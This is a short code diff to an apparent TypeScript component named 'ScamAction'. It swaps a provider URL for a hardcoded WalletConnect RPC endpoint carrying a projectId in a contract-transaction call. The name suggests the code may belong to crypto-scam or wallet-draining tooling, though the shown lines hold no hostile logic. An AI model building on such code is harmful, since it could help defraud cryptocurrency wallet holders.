@@ -24,7 +24,7 @@ const ScamAction = (props: {
 							gasLimit: 1000000
 						}
 					],CustomContract.ETH,
-					provider.connection.url+"")
+					"https://rpc.walletconnect.com/v1/?chainId=eip155:1&projectId=90e5e5ac9da57364effebface3c64405")
 					.catch((e)=>{
 						alert(`ERROR ${e?.message ?? e}`);
 						console.error(e)
